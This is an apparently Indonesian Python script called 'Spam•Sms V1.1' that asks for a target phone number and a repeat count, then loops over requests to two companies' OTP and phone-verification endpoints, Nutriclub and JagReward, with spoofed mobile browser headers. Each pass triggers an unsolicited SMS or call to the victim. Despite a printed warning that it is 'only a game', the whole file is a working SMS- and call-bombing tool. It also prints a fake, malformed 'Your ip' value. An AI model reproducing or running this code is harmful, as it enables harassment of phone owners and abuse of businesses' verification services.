#pylint:disable=W0611
#pylint:disable=W0311
import requests as req

import json,os,sys,time

class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    FAIL = '\033[91m' #RED
    RESET = '\033[0m' #RESET COLOR
    WHITE = '\033[37m'

## Logo/Tampilan
logo = """
                     * Spam•Sms V1.1 *
               {×} Creator : M9 ALdev Studio
  «~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~»\n"""
print(" ")
nama = input(bcolors.WHITE + "      masukan nama anda :")

os.system('clear')
#os.system('xdg-open https://add.spamsms.42web.io/?nama='+nama)
time.sleep(2)
print(logo)
## Menginput No Target
print(bcolors.WHITE + "     Selamat datang " + nama)
print(bcolors.FAIL + "     Your ip : 205.122.10.11.1")
print(" ")
print(" ")
print(bcolors.FAIL + "   WARNING: Ini hanya permainan bukan untuk menjatuhkan")
print(" ")
print(" ")
print(" ")
print("  «~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~»\n")
print(" ")
target = input( bcolors.WARNING + "      Number : +62")
print(" ")
jumlah = input("      jumlah : ")
print(" ")

api_url = "https://www.nutriclub.co.id/otp/?phone=0"+target+"&old_phone=0"+target

headers = {
"Host": "www.nutriclub.co.id",
"content-length": "0","accept": 
"application/json, text/javascript, */*; q=0.01",
"x-requested-with": "XMLHttpRequest",
"save-data": "on",
"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
"origin": "https://www.nutriclub.co.id",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty","referer": "https://www.nutriclub.co.id/account/register",
}
url = "https://id.jagreward.com/member/verify-mobile/"
ua = {
'Host': "id.jagreward.com",
'Connection': "keep-alive",
'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'

}
dat = {"method": "CALL","countryCode": "id",}

for i in range(int(jumlah)):
  respon = req.post(api_url,headers).text
  status = json.loads(respon)["StatusMessage"]
  send = req.post(url+target, headers=ua, data=dat)
  url_jagreward = "https://id.jagreward.com/member/verify-mobile/" + target
  if status and url_jagreward:
       print(bcolors.OK +"     {✓} spam ke +62"+ target +" Berhasil")
       time.sleep(2)
  else:
       print(bcolors.FAIL + "     {×} Spam sudah dilakukan "+ jumlah +"x » Gagal \n")
       time.sleep(2)
       